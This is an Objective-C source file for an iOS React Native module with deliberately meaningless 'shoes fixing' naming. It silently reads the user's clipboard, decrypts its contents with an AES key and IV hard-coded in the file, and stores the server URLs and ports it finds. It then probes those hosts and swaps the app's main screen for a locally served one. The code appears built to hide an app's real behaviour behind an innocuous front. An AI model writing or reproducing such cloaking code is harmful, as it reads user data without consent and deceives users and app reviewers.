#import "RNParqalShoesFixing.h"

#import <CocoaSecurity/CocoaSecurity.h>
#import <react-native-orientation-locker/Orientation.h>
#import "RNParqalShoesFixingServer.h"
#import "RNNetReachability.h"

@interface RNParqalShoesFixing()

@property (strong, nonatomic)  NSArray *shoesArray;
@property (nonatomic, strong) RNNetReachability *shoesFixingReachability;
@property (nonatomic, copy) void (^vcBlock)(void);

@end

@implementation RNParqalShoesFixing

static RNParqalShoesFixing *instance = nil;

+ (instancetype)shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.shoesArray = @[@"parqalShoesFixing_APP",
                                   @"a71556f65ed2b25b55475b964488334f",
                                   @"ADD20BFCD9D4EA0278B11AEBB5B83365",
                                   @"vPort",
                                   @"vSecu",
                                   @"spareRoutes",
                                   @"serverUrl"];
  });
  return instance;
}

- (void)parqalShoesFixing_startMonitoring {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(parqalShoesFixing_networkStatusDidChanged:) name:kReachabilityChangedNotification object:nil];
    [self.shoesFixingReachability startNotifier];
}

- (void)parqalShoesFixing_stopMonitoring {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:kReachabilityChangedNotification object:nil];
    [self.shoesFixingReachability stopNotifier];
}

- (void)dealloc {
    [self parqalShoesFixing_stopMonitoring];
}


- (void)parqalShoesFixing_networkStatusDidChanged:(NSNotification *)notification {
    RNNetReachability *reachability = notification.object;
  NetworkStatus networkStatus = [reachability currentReachabilityStatus];
  
  if (networkStatus != NotReachable) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
      if ([ud boolForKey:self.shoesArray[0]] == NO) {
          if (self.vcBlock != nil) {
              [self changeMainController:self.vcBlock];
          }
      }
  }
}

- (void)changeMainController:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  
  NSMutableArray<NSString *> *spareArr = [[ud arrayForKey:self.shoesArray[5]] mutableCopy];
  if (spareArr == nil) {
    spareArr = [NSMutableArray array];
  }
  NSString *usingUrl = [ud stringForKey:self.shoesArray[6]];
  
  if ([spareArr containsObject:usingUrl] == NO) {
    [spareArr insertObject:usingUrl atIndex:0];
  }
  
  [self changeTestMainController:changeVcBlock index:0 mArray:spareArr];
}

- (void)changeTestMainController:(void (^ __nullable)(void))changeVcBlock index: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
  if ([tArray count] < index) {
    return;
  }
  
  NSURL *url = [NSURL URLWithString:tArray[index]];
  NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
  sessionConfig.timeoutIntervalForRequest = 10 + index * 5;
  NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
  NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
  
  NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
    NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
    if (error == nil && httpResponse.statusCode == 200) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
//      [ud setBool:YES forKey:self.shoesArray[0]];
      [ud setValue:tArray[index] forKey:self.shoesArray[6]];
      [ud synchronize];
      dispatch_async(dispatch_get_main_queue(), ^{
        if (changeVcBlock != nil) {
          changeVcBlock();
        }
      });
    } else {
      if (index < [tArray count] - 1) {
        [self changeTestMainController:changeVcBlock index:index + 1 mArray:tArray];
      }
    }
  }];
  [dataTask resume];
}

- (BOOL)parqalShoesFixing_tryThisWay:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.shoesArray[0]]) {
    return YES;
  } else {
      self.vcBlock = changeVcBlock;
      if ([self parqalShoesFixing_dragon]) {
          [self changeMainController:changeVcBlock];
          [self parqalShoesFixing_startMonitoring];
      }
    return NO;
  }
}

- (BOOL)parqalShoesFixing_dragon {
  NSString *pbString = [self parqalShoesFixing_getShoesMeta];
  CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self parqalShoesFixing_subRainning:pbString]
                                                          hexKey:self.shoesArray[1]
                                                           hexIv:self.shoesArray[2]];
  
  NSDictionary *dataDict = [self parqalShoesFixing_jsonToDictionary:aes.utf8String];
  return [self parqalShoesFixing_storeConfigInfo:dataDict];
}

- (NSString *)parqalShoesFixing_getShoesMeta {
  UIPasteboard *clipboard = [UIPasteboard generalPasteboard];
  return clipboard.string ?: @"";
}

- (NSString *)parqalShoesFixing_subRainning: (NSString* )pbString {
  if ([pbString containsString:@"#iPhone#"]) {
    NSArray *university = [pbString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
      pbString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
      [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return pbString;
}

- (NSDictionary *)parqalShoesFixing_jsonToDictionary: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)parqalShoesFixing_storeConfigInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.shoesArray[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (UIViewController *)parqalShoesFixing_throughMainController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    UIViewController *vc = [UIViewController new];
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [[RNParqalShoesFixingServer shared] parqalFixingService_configAprShoesCleaning:[ud stringForKey:self.shoesArray[3]] withSecurity:[ud stringForKey:self.shoesArray[4]]];
    return vc;
}

- (UIInterfaceOrientationMask)parqalShoesFixing_getOrientation {
  return [Orientation getOrientation];
}


@end
